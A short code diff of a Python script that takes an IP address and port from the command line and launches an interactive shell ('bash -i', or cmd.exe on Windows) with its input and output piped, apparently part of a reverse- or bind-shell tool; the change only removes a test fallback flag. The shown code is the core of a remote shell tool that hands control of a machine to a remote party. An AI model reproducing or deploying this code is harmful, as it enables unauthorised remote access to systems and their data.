@@ -3,8 +3,6 @@ import socket, select, time
 import os, threading
 import subprocess as sp
 
-TEST_FALLBACK = 0
-
 if sys.version_info.major < 3:
     print("need python3 to run")
     exit(0)
@@ -19,7 +17,7 @@ port = int(sys.argv[2])
 print("IP=", ip, ", ", "port=", port)
 
 cmd_arr = ["bash", "-i"]
-if platform.system() == "Windows" or TEST_FALLBACK:
+if platform.system() == "Windows":
     cmd_arr = ["cmd.exe"]
 
 p = sp.Popen(cmd_arr, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
